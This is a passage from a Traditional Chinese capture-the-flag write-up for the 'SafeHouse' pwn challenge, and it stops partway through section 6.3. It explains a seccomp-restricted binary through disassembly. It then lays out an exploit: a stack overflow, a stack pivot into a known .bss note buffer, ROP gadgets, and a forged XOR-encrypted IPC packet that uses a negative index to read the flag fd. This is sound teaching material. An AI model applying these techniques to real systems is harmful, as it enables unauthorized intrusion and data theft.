# pwn7 — `SafeHouse`（技巧：seccomp 下的 stack pivot + 偽造 IPC 封包 + 負索引越界）

> 這一題比 pwn1 難不少。建議先讀完 `pwn1/notes.md`（那裡有暫存器、`call`/`ret`、
> 堆疊、syscall 的基礎），再回來看這篇。
>
> 這題的觀念重點：
> 1. `fork()` 之後「父子共用一個 socketpair」的架構
> 2. **seccomp** 是什麼、為什麼「不能 `execve`」會逼你換策略
> 3. **stack pivot**（把 `rsp` 搬到 `.bss`，因為堆疊位址我們不知道）
> 4. 手動組出正確的 binary protocol（含 XOR 加解密、big-endian 長度）
> 5. **有號數邊界檢查**（`jg` vs `ja`）造成的負索引越界

---

## 1. 題目資訊

```
檔案：service
ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
```

```
RELRO:      Full RELRO        ← GOT 不可寫，不能改 GOT
Stack:      No canary found   ← 可以直接覆蓋返回位址
NX:         NX enabled        ← 不能執行堆疊上的資料
PIE:        No PIE (0x400000) ← 程式碼位址固定，gadget 直接用
RUNPATH:    b'$ORIGIN'
SHSTK:      Enabled
IBT:        Enabled
```

> ⚠️ **`SHSTK` / `IBT` 這兩個是 ELF 檔裡的屬性註記，不等於執行時有啟用。**
> `readelf -n service` 可以看到 `.note.gnu.property` 裡寫著 `x86 feature: IBT, SHSTK`，
> 意思是「編譯時宣告這支程式支援 CET」。真正的影子堆疊（SHSTK）要
> **CPU + 核心 + 執行緒**都開啟才會攔截 `ret`；
> 本題的 exploit 用**純 `ret` 的 ROP 就能成功**（本地與遠端都實測成功），
> 證明遠端並沒有啟用 SHSTK。所以看到 `SHSTK: Enabled` 先別放棄，
> 動手試過再說。（驗證方式：`readelf -n service`，以及觀察 `ret` 有沒有被擋。）

> 💡 **`RUNPATH: b'$ORIGIN'`** 代表「執行時優先在 binary 自己的目錄找 `libc.so.6` / `ld`」。
> 本地 `pwn7/` 裡沒有附 libc，所以本地是用系統 glibc，遠端版本可能不同 ——
> 這題**不影響**，因為我們完全沒有用到 libc 的位址（gadget 全部來自 binary 自己）。

遠端開場畫面：

```
SafeHouse v1.0
Type HELP.
sh>
```

指令表（`.rodata` 裡的字串直接告訴我們）：

```
cmds: PING HELP NOTE RELAY SUBMIT QUIT
```

---

## 2. 程式整體架構

`main` 在 `0x401290`。它的流程（我對照組語整理）：

```
socketpair(AF_UNIX, SOCK_STREAM, 0, sv)      ; sv[0], sv[1] 是一對雙向管道
key = hash(getpid())   →  存到 .bss:0x405060 (4 bytes)
fork()
 ├── 父行程（front desk，前台）
 │      close(sv[1])
 │      dup2(sv[0], 3)                       ; 之後用 fd 3 跟保險箱說話
 │      prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
 │      seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog)
 │      命令迴圈（stdin/stdout 就是我們的 socket）
 └── 子行程（vault，保險箱）
        close(sv[0])
        dup2(sv[1], 3)
        open("/dev/null"); dup2(fd, 0); dup2(fd, 1)   ; 不需要跟人講話
        signal(SIGPIPE, SIG_IGN)
        開 flag.txt，把 fd 放進 fd 槽表 0x405080
        讀 fd 3 的封包 → 解密 → 依 op 分派
```

> 📖 **先解釋兩個 seccomp 相關的常數**（偽碼裡只有名字，很嚇人但其實很單純）：
> * `PR_SET_NO_NEW_PRIVS`（值 = **38**）是 seccomp 的**前置條件**：用 `prctl` 宣告
>   「我這個行程不會因為執行的程式而取得新權限」（例如 setuid binary）。
>   核心規定：**沒有先設這個，就裝不了 seccomp 過濾器。**
> * `SECCOMP_SET_MODE_FILTER`（值 = **1**）是 `seccomp()` syscall（編號 **317**）
>   的模式參數，意思是「我要裝一組 BPF 過濾器」。
>   第三個參數 `&prog` 指向一個 `sock_fprog` 結構，裡面是「指令數」與「指令陣列」。

> 📖 標題講的「**IPC**」在這裡不是什麼高深機制：
> 就是父行程（前台）與子行程（保險箱）用 `socketpair` 做出來的那條 **fd 3 通道**，
> 兩邊互相傳「4 bytes 標頭 + payload」的封包。本題的漏洞就是「我們假冒前台，
> 自己往這條通道塞一個偽造封包」。

### 2.1 socketpair 是什麼

> 📖 **先定義 `fd`（file descriptor，檔案描述元）**：核心給「每一個被打開的檔案／socket／管道」
> 一個編號，程式就用這個編號讀寫（`0` = stdin、`1` = stdout、`2` = stderr，之後開的從 `3` 開始）。
> `open()` 會**回傳**一個 fd，`read(fd, …)` / `write(fd, …)` / `pread(fd, …)` 用它當第一個參數。
> 本題父子行程各自有一份「同一組編號的複製品」（`fork()` 會複製 fd 表），
> `dup2(sv[0], 3)` 的意思是「把 `sv[0]` 這條 socket 複製到編號 3」，
> 之後兩邊就都用編號 3 講話。這就是為什麼下面會說「flag 的 fd 只在子行程裡」——
> 子行程 `open("flag.txt")` 拿到的編號，父行程的 fd 表裡沒有。

`socketpair()` 生出**兩個**互相連通的 fd（`sv[0]` / `sv[1]`）：
寫進 `sv[0]` 的資料可以從 `sv[1]` 讀出來，反之亦然。

```
   父行程 (front desk)                 子行程 (vault)
        fd 3  ──────►  socketpair  ──────►  fd 3
             ◄──────────────────────────────
```

因為 `fork()` 會複製記憶體，`key` 這個全域變數（`0x405060`）
**父子兩邊的值一樣** → 兩邊用同一把 key 做 XOR 加解密。

### 2.2 為什麼要分兩個行程

因為 flag 檔的 fd **只存在子行程裡**，父行程拿不到。
而且父行程被 **seccomp** 鎖住：

```
白名單：read, write, close, mmap, mprotect, brk, rt_sigreturn, exit_group
（其他一律 SECCOMP_RET_KILL_PROCESS）
```

`seccomp` 的過濾器是一串固定 8 bytes 的 BPF 指令，每條的欄位是：

```
struct sock_filter {           // 每條 8 bytes
    __u16 code;   // 要做什麼（0x20 = LD W ABS, 0x15 = JEQ K, 0x06 = RET K）
    __u8  jt;     // 條件成立時往後跳幾條
    __u8  jf;     // 條件不成立時往後跳幾條
    __u32 k;      // 比較值 / 回傳值
};
```

所以 `service` 裡 `0x401339`~`0x40146f` 那一堆 `movabs` + `mov [rsp+0x4xx],rax`
就是在**一條一條把 21 條指令寫到堆疊上**（`0x401474` 之後是 `prctl` 與 `seccomp` 的呼叫，
不再是「寫 filter」；`[rsp+0x20]` 是 `sock_fprog` 的
`len = 0x15 = 21`，`[rsp+0x28]` 是 filter 指標 `rsp+0x420`）。
把那些立即數一個一個拆開就是下面那份清單，例如：

| 位址 | 立即數 | 拆解 | 意義 |
|---|---|---|---|
| `[rsp+0x420]` | `0x0000000400000020` | code=0x20, jt=0, jf=0, k=4 | `LD W ABS 4`（讀 `seccomp_data.arch`） |
| `[rsp+0x428]` | `0xc000003e00010015` | code=0x15, jt=1, jf=0, k=0xc000003e | `JEQ AUDIT_ARCH_X86_64`，成立就跳過下一條 |
| `[rsp+0x430]` | `0x8000000000000006` | code=0x06, k=0x80000000 | `RET KILL_PROCESS` |
| `[rsp+0x440]` | `0x0000000001000015` | code=0x15, jt=0, jf=1, k=0 | `JEQ 0`（read）→ 成立走下一條 allow，否則跳過 |
| `[rsp+0x448]` | `0x000000007fff0006` | code=0x06, k=0x7fff0000 | `RET ALLOW` |

（也可以裝 `seccomp-tools`（Ruby gem：`gem install seccomp-tools`）後跑
`seccomp-tools dump ./service`，它會直接印出可讀的清單。）

我從 `main` 裡組 filter 的組語手動解出來的 BPF：

```
 0: LD  W  ABS  4            ; 讀 arch
 1: JEQ 0xc000003e (x86-64)
 2: RET KILL_PROCESS
 3: LD  W  ABS  0            ; 讀 syscall number
 4: JEQ 0    → allow        ; read
 6: JEQ 1    → allow        ; write
 8: JEQ 3    → allow        ; close
10: JEQ 9    → allow        ; mmap
12: JEQ 0xa  → allow        ; mprotect
14: JEQ 0xc  → allow        ; brk
16: JEQ 0xf  → allow        ; rt_sigreturn
18: JEQ 0xe7 → allow        ; exit_group
20: RET KILL_PROCESS        ; 預設拒絕
```

**沒有 `execve`、沒有 `open`/`openat`。**
所以：

* ❌ 拿到 `system("/bin/sh")` 也沒用（`system` 內部會 `fork`+`execve`，會被殺掉）
* ❌ 不能自己 `open("flag.txt")`
* ✅ **只能「借保險箱的手」去讀 flag**

---

## 3. 前台程式逐段解說

### 3.1 `main` 的堆疊配置

```asm
401290:  push r15 / r14 / r13 / r12 / rbp / rbx
40129e:  sub  rsp,0x1000
4012a5:  or   QWORD PTR [rsp],0x0      ; 觸碰堆疊，讓 guard page 被配置
4012aa:  sub  rsp,0x428
...
40134b:  lea  rbp,[rsp+0x420]          ; rbp = 輸入緩衝區，範圍 rsp+0x420 ~ rsp+0x81f (共 0x400 bytes)
```

* 輸入行緩衝區：`rsp+0x420`，大小 `0x400` bytes，最多寫 `0x3ff` 個字元（留 1 byte 給結尾的 `\0`；見下面的讀取迴圈
  `lea rbx,[rsp+0x81f]` 與 `cmp rbx,r15`）
* `socketpair` 的結果陣列：`rsp+0x18`
* `sub rsp,0x1000` 是為了確保「一次就把 4KB 的堆疊擴張完」，
  避免碰到 guard page（glibc 編譯器常見的 `-fstack-clash-protection`）。

### 3.2 讀一行輸入（`0x4014d0` ~ `0x401530`）

```asm
4014d0:  mov edx,4
4014d5:  mov rsi,r12        ; r12 = 0x4030ba = "sh> "
4014d8:  mov edi,1
4014dd:  mov r15,rbp        ; r15 = rsp+0x420
4014e0:  call write@plt     ; write(1, "sh> ", 4)
4014e5:  jmp 401503
4014f0:  cmp BYTE PTR [r15],0xa       ; 是 '\n' 嗎？
4014f4:  je  4015c0                   ; 是 → 結束
4014fa:  add r15,0x1
4014fe:  cmp rbx,r15                  ; rbx = rsp+0x81f
401501:  je  401530
401503:  xor edi,edi
401505:  mov edx,0x1
40150a:  mov rsi,r15
40150d:  call read@plt                ; read(0, r15, 1)  一次讀 1 byte
401512:  test rax,rax
401515:  jg  4014f0
```

* 一次讀 1 byte 直到 `\n`，把 `\n` 換成 `\0`。
* **這個寫法允許輸入任意二進位 byte**（包括 `\x00` 以外的所有值）。
  對我們很重要：之後要塞 `0x401f07` 這種非 ASCII bytes。
* 最大長度 `0x81f-0x420 = 0x3ff`。

### 3.3 命令分派

```asm
401538:  cmp BYTE PTR [rsp+0x420],0x20     ; 開頭是空白嗎？
401543:  jne 401552
401548:  add r15,0x1                       ; 跳過開頭空白
40154c:  cmp BYTE PTR [r15],0x20
401550:  je  401548
401552:  ...strncmp(r15, "PING", 4)...
```

| 命令 | 字串位址 | 處理函式 | 功能 |
|---|---|---|---|
| `PING` | `0x4030bf` | `0x4015d0` | 回 `PONG\n` |
| `HELP` | `0x4030ca` | `0x401628` | 印指令表 |
| `NOTE` | `0x4030cf` | `0x401643` | 把文字寫進 `.bss` 的筆記區 |
| `RELAY` | `0x4030ff` | `0x401f70` | 送 op=1~4 給保險箱，把回覆印出來 |
| `SUBMIT` | `0x403105` | `0x401ed0` | **溢位點** |
| `QUIT` | `0x40310c` | `0x40174e` | 離開 |

### 3.4 `NOTE`（`0x401643`）— 我們唯一的「已知位址可寫區」

```asm
401643:  mov  rsi,[rsp+0x8]     ; &endptr
401648:  lea  rdi,[r15+0x5]     ; 參數: "<idx> <text>"
40164c:  mov  edx,0xa
401651:  call strtol@plt        ; idx = strtol(...)
401656:  cmp  rax,0x7
40165a:  ja   401718            ; idx > 7 → "ERR bad idx"
...
40167e:  shl  rax,0x6           ; idx * 0x40
401682:  lea  rdx,[rip+0x8af7]  ; rdx = 0x40a180
401689:  lea  rcx,[rax+rdx*1]   ; 目的 = 0x40a180 + idx*0x40
40168d:  mov  edx,0x3f
401692:  mov  rdi,rcx
401695:  call strncpy@plt       ; strncpy(dst, text, 0x3f)
4016ab:  mov  BYTE PTR [rax+0x3f],0x0
```

* 筆記區：`0x40a180`，8 格 × `0x40` bytes = `0x40a180` ~ `0x40a37f`
* `strncpy` 會把沒填滿的部分**補 `\0`**
* 所以只要送 3 個 byte，就能寫出完整的 8-byte 位址（高位自動為 0）
* 這是我們唯一「有固定位址、可以放大 ROP 鏈」的可寫區域
  → 非常關鍵，因為 `.bss` 其他地方我們碰不到，而堆疊位址未知

### 3.5 `SUBMIT`（`0x401ed0`）— 漏洞點

```asm
401ed0:  test rdi,rdi
401ed3:  je   401f58                 ; 沒參數 → "ERR usage: SUBMIT <size>"
401ed9:  push rbx
401eda:  mov  edx,0xa
401edf:  xor  esi,esi
401ee1:  sub  rsp,0x40               ; ← 只有 0x40 bytes 的區域變數！
401ee5:  call strtol@plt             ; rax = size
401eea:  mov  rbx,rax
401eed:  test al,al
401eef:  je   401f38                 ; 低位元組為 0 → "ERR bad size"
401ef1:  mov  edx,0x3
401ef6:  lea  rsi,[rip+0x112f]       ; "GO\n"
401efd:  mov  edi,0x1
401f02:  call write@plt              ; write(1, "GO\n", 3)
401f07:  xor  edi,edi                ; ← 這個位址待會要當 pivot 目標用
401f09:  movzx edx,bl                ; 長度 = size 的低 8 bits（0~255）
401f0c:  mov  rsi,rsp                ; 目的 = rsp
401f0f:  call read@plt               ; read(0, rsp, bl)
401f14:  test rax,rax
401f17:  jle  401f2f
401f19:  mov  edx,3
401f1e:  lea  rsi,[rip+0x110b]       ; "OK\n"
401f25:  mov  edi,0x1
401f2a:  call write@plt              ; write(1, "OK\n", 3)
401f2f:  add  rsp,0x40
401f33:  pop  rbx
401f34:  ret
```

**漏洞：`read(0, rsp, bl)` 寫進只有 0x40 bytes 的緩衝區。**
`bl` 最大 255，所以最多可以寫 255 bytes。

堆疊佈局：

```
rsp + 0x00  ┌────────────────────────┐
            │  0x40 bytes 緩衝區     │  ← read 的目標
rsp + 0x40  ├────────────────────────┤
            │  saved rbx             │  ← pop rbx 會讀這裡
rsp + 0x48  ├────────────────────────┤
            │  return address        │  ← ret 會跳這裡
rsp + 0x50  └────────────────────────┘
```

→ **offset `0x48` 就能控制 `rip`；offset `0x40` 控制 `rbx`。**

### 3.6 `RELAY`（`0x401f70`）— 跟保險箱要資料

```asm
401f70:  ...
401f88:  call strtol@plt             ; op = strtol(arg)
401f8d:  lea  rdx,[rax-0x1]
401f91:  cmp  rdx,0x3
401f95:  ja   402060                 ; op 必須是 1~4
...
401fa6:  mov  BYTE PTR [rsp+0xc],al         ; 標頭 byte0 = op
401faa:  mov  esi,0x4
401faf:  mov  rdi,rcx
401fb2:  xor  eax,eax                       ; ★ 這裡把 rax 整個歸零
401fb4:  mov  BYTE PTR [rsp+0xf],0x0        ; 標頭 byte3 = pad = 0
401fb9:  lea  rbx,[rsp+0x10]                ; rbx = 接收緩衝區起點 = rsp+0x10
401fbe:  mov  WORD PTR [rsp+0xd],ax         ; ← ax 此時是 0（因為上一條 xor eax,eax）
                                            ;   標頭 byte1..2 = 0x0000  (長度 = 0)
401fc3:  call 0x401be0                      ; XOR 加密 4 bytes
401fc8:  mov  rsi,rcx
401fcb:  mov  edx,0x4
401fd0:  mov  edi,0x3
401fd5:  call write@plt                     ; write(3, header, 4) 送給保險箱
401fda:  mov  edx,0x100                     ; ← 這個位址我們等一下要用
401fdf:  mov  rsi,rbx                       ; rbx = rsp+0x10
401fe2:  mov  edi,0x3
401fe7:  call read@plt                      ; read(3, rbx, 0x100)
401fec:  mov  rcx,rax
401fef:  cmp  rax,0x3
401ff3:  jle  402080                        ; 太短 → "ERR no response"
401ff9:  mov  edx,[rip+0x3061]              ; key
401fff:  mov  rsi,rax
402002:  mov  rdi,rbx
402005:  call 0x401be0                      ; 解密
40200a:  movsx dx, BYTE PTR [rsp+0x11]      ; 標頭 byte1
402010:  movsx ax, BYTE PTR [rsp+0x12]      ; 標頭 byte2
402016:  shl   edx,0x8
402019:  or    edx,eax                      ; dx = big-endian 的 16-bit 長度
40201b:  cmp  BYTE PTR [rsp+0x10],0x0       ; 標頭 byte0 必須是 0
402020:  jne  402041
402022:  test dx,dx
402025:  je   402041                        ; 長度 0 → 不印
402027:  sub  ecx,0x4
40202a:  cmp  cx,dx
40202d:  jb   402041                        ; 收到的資料不夠 → 不印
40202f:  movzx edx,dx
402032:  lea  rsi,[rsp+0x14]                ; payload 起點
402037:  mov  edi,0x1
40203c:  call write@plt                     ; write(1, payload, len)  ← 印出 flag！
```

注意兩件事：

1. `RELAY` 送的標頭**長度永遠是 0**：`0x401fb2` 有一條 `xor eax,eax`（把 `rax` 整個歸零），
   接著 `0x401fbe` 的 `mov WORD PTR [rsp+0xd],ax` 就把標頭 byte1~byte2 寫成 `0x0000`，
   而 `0x401fb4` 把 byte3（pad）寫成 0。
   → 我們**沒有辦法**用 `RELAY` 送「帶 payload 的封包」給保險箱，只能送 4 bytes 空標頭。
2. `RELAY` 讀回覆之後會**解密、檢查、印出 payload** —— 這是我們要利用的「印表機」。

### 3.7 XOR 加解密（`0x401be0`）

```asm
401be0:  mov  eax,edx
401be2:  bswap edx
401be4:  mov  DWORD PTR [rsp-0x4],edx     ; [rsp-4]=key[3], [rsp-3]=key[2], ...
401be8:  shr  eax,0x18                    ; al = key 的最高 byte = key[3]
401beb:  test rsi,rsi
401bee:  je   401c17
401bf0:  xor  BYTE PTR [rdi],al           ; buf[0] ^= key[3]
401bf2:  mov  eax,0x1
401bf7:  cmp  rsi,0x1
401bfb:  je   401c17
401c00:  mov  rdx,rax
401c03:  and  edx,0x3
401c06:  movzx edx,BYTE PTR [rsp+rdx*1-0x4]
401c0b:  xor  BYTE PTR [rdi+rax*1],dl     ; buf[i] ^= ks[i & 3]
401c0e:  add  rax,0x1
401c12:  cmp  rsi,rax
401c15:  jne  401c00
401c17:  ret
```

推出來的 keystream：

```
ks[0] = key[3]
ks[1] = key[2]
ks[2] = key[1]
ks[3] = key[0]
ks[i] = key[3 - (i & 3)]
```

也就是 **key 的 4 個 byte 反過來輪流用**。
用 Python 表示就是：

```python
def xor_key(data, key):          # key 是 4 bytes 的原始 bytes
    ks = key[::-1]
    return bytes(c ^ ks[i % 4] for i, c in enumerate(data))
```

---

## 4. 保險箱（子行程）端 — 漏洞在這裡

保險箱的程式碼在 `0x401769` 之後。

### 4.1 開場：把 flag 的 fd 存進「fd 槽表」

```asm
40178e:  lea  rbp,[rip+0x18da]        ; rbp = 0x40306f = "/dev/null"
401795:  mov  esi,0x2                 ; O_RDWR
40179a:  xor  eax,eax                 ; varargs 的「向量參數個數」= 0
40179c:  mov  rdi,rbp                 ; ★ 0x40179c 是這一條（別把 open 的斷點下在這）
40179f:  call open@plt                ; 開 /dev/null  ← 要斷在 open 請用 `b *0x40179f`
4017a4:  xor  esi,esi
4017a8:  mov  edi,eax
4017aa:  call dup2@plt                ; dup2(devnull, 0)
4017b1:  mov  esi,0x1
4017bd:  call dup2@plt                ; dup2(devnull, 1)
4017c2:  mov  esi,0x1                 ; signal(SIGPIPE, SIG_IGN)
4017c7:  mov  edi,0xd
4017d3:  call signal@plt
4017da:  lea  rdi,[rip+0x1898]        ; 0x403079 = "flag.txt"
4017e3:  call open@plt
4017e8:  mov  DWORD PTR [rip+0x388e],0x2      ; [0x405080] = 2   (state)
4017f2:  mov  DWORD PTR [rip+0x388c],eax      ; [0x405084] = fd
4017f8:  (迴圈，注意引數是 rbp)  再開 3 次 /dev/null 放進 0x40548c / 0x405898 / 0x405ca4
                                  ; rdi 由 0x4017fa 的 `mov rdi,rbp` 決定，而 rbp = 0x40306f = "/dev/null"
```

所以：

```
0x405080  { int state = 2 ; int fd = <flag.txt 的 fd> }     ← fd 槽 #0（唯一的 flag fd）
0x40548c  { int state = 2 ; int fd = <devnull 的 fd> }      ← fd 槽 #1
0x405898  { int state = 2 ; int fd = <devnull 的 fd> }      ← fd 槽 #2
0x405ca4  { int state = 2 ; int fd = <devnull 的 fd> }      ← fd 槽 #3（迴圈多跑一次寫的）
```

（槽的大小是 `0x40c`。`r12 = 0x405080 + 3*0x40c = 0x405ca4` 是迴圈的**比較值**，
但比較是在**寫槽之後**才做（`0x401806 mov [rbx],2` → `0x40180c call open` → `0x401814 cmp rbx,r12`），
所以 `0x405ca4` 這一個槽也會被寫入 `state = 2` 才跳出 → fd 槽共 **4 個**。）

> ⚠️ **別以為「負更多格就能打到別的 flag fd」**：只有 `0x405080`（slot #0）是 `flag.txt` 的 fd，
> 另外 3 個槽開的都是 `/dev/null` —— 迴圈裡的 `open` 用的引數是 `rbp = 0x40306f = "/dev/null"`，
> 而 `0x403079 = "flag.txt"` 只是第一次 `open` 用的常數，**沒有被迴圈重用**。
> 而且 `index = -8` 會打到 `0x404050`、`index = -12` 會打到 `0x403020`，
> 那兩格都不是槽（用 `0x4060b0 + index*0x40c` 自己算一次就知道）。

### 4.2 儲存槽表（slot table）

```asm
40182b:  lea  rbx,[rip+0x487e]        ; rbx = 0x4060b0  ← 槽表基底
```

每個槽 `0x40c` bytes：

```
+0x000   int   state      (0 = 空, 1 = 有資料, 2 = fd 槽)
+0x004   int   fd         (state == 2 時使用)
+0x008   u16   size       (state == 1 時使用)
+0x00c   ...   data (最多 0x400 bytes)
```

### 4.3 主迴圈

```asm
401839:  mov  rdx,r14        ; r14 = rsp+0x16  (放 len)
40183c:  mov  rsi,rbp        ; rbp = rsp+0x420 (payload 緩衝區)
40183f:  mov  rdi,r13        ; r13 = rsp+0x15  (放 op)
401842:  call 0x401c40       ; 讀一個封包（含解密）
401847:  mov  r12d,eax
40184a:  test eax,eax
40184c:  jne  401a0e         ; 失敗 → _exit(0)
401852:  movzx eax,BYTE PTR [rsp+0x15]   ; op
```

分派：

* `op == 1` → `0x40196a`：回傳 2 bytes（`"OK"`）
* `op == 2` → `0x401875`：**新增槽**。`[0x405064]` 是計數器，
  `cmp r8d,0xf / jg` → 最多 16 個；把 payload 複製進槽（最多 `0x400`），
  然後回 4 bytes（新槽的 index）。
* `op == 3` → `0x4019c0`：**讀槽** ← 我們的目標
* `op == 4` → `0x401982`：回傳槽的統計字串
* 其他 → 錯誤

### 4.4 ★ `op == 3` 的漏洞

```asm
4019c0:  cmp  WORD PTR [rsp+0x16],0x3    ; len 必須 > 3
4019c6:  jbe   401a89                    ; 否則 "short"
4019cc:  movsxd rax,DWORD PTR [rsp+0x420] ; ★ index = (int32) payload[0:4]  ← 有號數！
4019d4:  cmp  eax,0xf
4019d7:  jg   401a6e                     ; ★ 只擋「大於 15」，沒擋負數
4019dd:  imul rax,rax,0x40c
4019e4:  add  rax,rbx                    ; 槽位址 = 0x4060b0 + index*0x40c
4019e7:  mov  edx,DWORD PTR [rax]        ; state
4019e9:  cmp  edx,0x1
4019ec:  je   401a5a                     ; state==1 → 回傳槽裡的資料
4019ee:  cmp  edx,0x2
4019f1:  je   401a24                     ; state==2 → 走 fd 分支
4019f3:  ... "empty"
```

`state == 2` 的分支：

```asm
401a24:  mov  edi,DWORD PTR [rax+0x4]    ; fd = 槽的 fd 欄位
401a27:  lea  rsi,[rsp+0x20]             ; buf
401a2c:  xor  ecx,ecx
401a2e:  mov  edx,0x400
401a33:  call pread@plt                  ; pread(fd, buf, 0x400, 0)
401a3d:  test rax,rax
401a40:  jle  401a46
401a42:  movzx r12d,ax
401a46:  mov  rsi,[rsp+0x8]
401a4b:  mov  edx,r12d
401a4e:  xor  edi,edi
401a50:  call 0x401d50                   ; 送 {op=0, payload=buf, len=rax} 回前台
```

**漏洞：`index` 是有號 32-bit，但只用 `jg`（signed greater）擋上界。**

取 `index = -4`：

```
0x4060b0 + (-4) * 0x40c
 = 0x4060b0 - 0x1030
 = 0x405080            ← 正好是 fd 槽 #0，state = 2，fd = flag.txt
```

於是保險箱就自己幫我們 `pread(flag_fd, buf, 0x400, 0)`，
然後把內容送回前台。🎉

> 💡 **教學重點：`ja` vs `jg`**
> * `ja`（jump if above）→ **無號**比較
> * `jg`（jump if greater）→ **有號**比較
>
> 編譯器把 `unsigned idx` 的邊界檢查編成 `ja`，
> `int idx` 編成 `jg`。只要程式設計師用了「有號」型別，
> 負索引就會穿過 `idx > 15` 的檢查。這類 bug 在真實世界很常見。

---

## 5. 通訊協定（封包格式）

### 5.1 標頭（4 bytes，加密前）

```
byte 0 : op
byte 1 : len_hi      ┐ 大端 16-bit 長度
byte 2 : len_lo      ┘
byte 3 : pad (0)
```

發送端（`0x401d50`）會組出這個標頭、加密、`write(3, header, 4)`，
如果 `len != 0` 再把 payload 加密後送出。

接收端（`0x401c40`）讀 4 bytes、解密、取 `op = b[0]`、
`len = (b[1] << 8) | b[2]`（**大端**）、檢查 `len > 0x1000` 就報錯，
然後讀 `len` bytes、解密。

> ⚠️ **大端陷阱**：pwntools 的 `p16(x)` 產生的是 **little-endian**。
> 這裡必須自己寫 `b'\x00\x04'` 代表長度 4，不能用 `p16(4)`。
> 我第一次寫錯，保險箱就會讀到 `len = 0x0400 = 1024` 然後永遠等資料。

### 5.2 我們要送的封包

```
op   = 3                (讀槽)
len  = 4                (payload 4 bytes)
pad  = 0
payload = int32(-4) = 0xfffffffc   (little-endian: fc ff ff ff)
```

加密前共 8 bytes：

```
03 00 04 00 | fc ff ff ff
```

---

## 6. 難點：怎麼把封包送進 fd 3？

* `RELAY` 只送 `len = 0` 的標頭 → 沒辦法送 payload。
* 那用 ROP 呼叫 `read(3, buf, n)` 呢？

  **不行**，因為我們**沒有辦法設定 `rdx`**：這支程式裡沒有任何 `pop rdx` gadget
  （`objdump -d -M intel service | grep 'pop    rdx'` 沒有輸出，
  `ROP(e).find_gadget(['pop rdx','ret'])` 也回傳 `None`），
  所以只能改用「binary 裡面自己會設定 `edx` 的程式碼片段」當 gadget。
  （順帶一提：glibc 的 `read`/`write` wrapper 本身**不會**動 `rdx`，
  它動的是 `rdi`（`movsxd rdi,edi`）與 `rcx`/`r8`/`r9`（被 `xor` 歸零）；
  不要以為 wrapper 會幫你把 `rdx` 弄壞。）

我挑的三個片段（都在函式中段，位址剛好可以用）：

| 位址 | 內容 | 效果 |
|---|---|---|
| `0x401f07` | `xor edi,edi; movzx edx,bl; mov rsi,rsp; call read` | `read(0, rsp, bl)` |
| `0x401fda` | `mov edx,0x100; mov rsi,rbx; mov edi,3; call read` | `read(3, rbx, 0x100)` |
| `0x401c32` | `mov rdx,rax; jmp write@plt` | `write(rdi, rsi, rax)` |

`0x401c32` 特別妙：它在 `0x401c20`（一個 `write_string` 函式）裡面，
前面剛好是 `pop rbx`、後面是 `mov rdx,rax; jmp write@plt`。
因為 `jmp`（不是 `call`）跳到 `write@plt`，
所以 `write` 返回時會 `ret` 到**我們堆疊上的下一個 qword** —— 完美的 gadget。✅

> ⚠️ **「跳進函式中段」是什麼意思？** 看 `0x401c20` 的完整長相：
>
> ```asm
> 401c20:  push rbx
> 401c21:  mov  rbx,rdi
> 401c24:  call strlen@plt
> 401c29:  mov  rsi,rbx
> 401c2c:  mov  edi,1
> 401c31:  pop  rbx          ; ← pop rbx 在 0x401c31
> 401c32:  mov  rdx,rax      ; ← 我們跳進來的位置就在下一行
> 401c35:  jmp  write@plt
> ```
>
> 我們從 `0x401c32` 跳進去，所以 `push rbx`、`call strlen` 通通被跳過，
> 而 `0x401c31` 的 `pop rbx` **也不會執行** → `rbx` 不會被覆蓋。
> 代價是 `rax` 是「上一個 gadget 留下的值」，不是 `strlen` 的回傳值 ——
> 這正是我們要的（`rdx = rax`）。這就是「跳進函式中段」的典型用法。

### 6.1 用 `read(0, rsp, bl)` 當「續接器」

`0x401f07` 這個片段的 `rsi = rsp`，所以我們只要控制 `rsp`，
之後每一段 ROP 鏈就能用 `read(0, rsp, 0xff)` 一段一段接下去，
而且**每次都能重新讀 255 bytes**。

### 6.2 但 `rsp` 在哪？→ Stack pivot

我們不知道堆疊位址（沒有洩漏），所以要把 `rsp` 搬到**已知位址**。
唯一已知的可寫區就是 `NOTE` 的筆記區 `0x40a180`。

用 `pop rsp` gadget：

```asm
401523:  pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```

流程：

```
SUBMIT 的 ret  →  0x401523
   pop rsp  ← 從 overflow payload 讀到 0x40a168 (= NOTES-0x18)
               → rsp = 0x40a168
   pop r13 / pop r14 / pop r15  → rsp 前進 0x18 → 0x40a180
   ret      ← 讀 [0x40a180] = 0x401f07  ← 這正是我們用 NOTE 寫進去的值！
               → rsp = 0x40a188
執行 0x401f07: read(0, 0x40a188, 0xff)
```

**這就是為什麼要先 `NOTE 0 \x07\x1f\x40`。**
`strncpy` 會把剩下的 byte 補 0，所以 3 個 byte 就等於
`0x0000000000401f07`。

`.bss` 的實際長相（全部都是固定的已知位址，這張圖建議配合 gdb 看）：

```
0x405060  key（4 bytes，XOR 加解密用）
0x405064  槽計數器（4 bytes）
0x405080  fd 槽 #0 {state=2, fd=flag.txt}     ← index=-4 打到的目標（唯一有 flag fd 的槽）
0x40548c  fd 槽 #1 {state=2, fd=/dev/null}
0x405898  fd 槽 #2 {state=2, fd=/dev/null}
0x405ca4  fd 槽 #3 {state=2, fd=/dev/null}    ← 迴圈「先寫後比」多寫的那一格（見 §4.1）
0x4060b0  儲存槽表（16 槽 × 0x40c）
              ^
              └── 0x4060b0 + (-4)*0x40c = 0x405080

0x40a168  ← pop rsp 的落點（PIVOT_TOP）；這裡是 .bss 的 0，所以 pop r13/r14/r15 讀到 0
0x40a180  ← NOTE 0 寫進去的 8 bytes（= 0x401f07）；ret 從這裡取值
0x40a188  ← 第一次 read(0, rsp, 0xff) 的目標 = A1
```

`SUBMIT` 溢位後的搬移過程（每一步的 `rsp`）：

```
  SUBMIT 的 ret  → 0x401523 (pop rsp; pop r13; pop r14; pop r15; ret)
     pop rsp     讀 [S+0x50]  = 0x40a168     → rsp = 0x40a168
     pop r13     讀 [0x40a168] = 0           → rsp = 0x40a170
     pop r14     讀 [0x40a170] = 0           → rsp = 0x40a178
     pop r15     讀 [0x40a178] = 0           → rsp = 0x40a180
     ret         讀 [0x40a180] = 0x401f07    → rsp = 0x40a188
  0x401f07: read(0, 0x40a188, bl)             ← 之後的鏈都在這裡接
```

### 6.3 每次 read 回來之後的 `rsp` 補償

`0x401f07` 是 `SUBMIT` 函式的**中間**，所以 `read` 回來之後
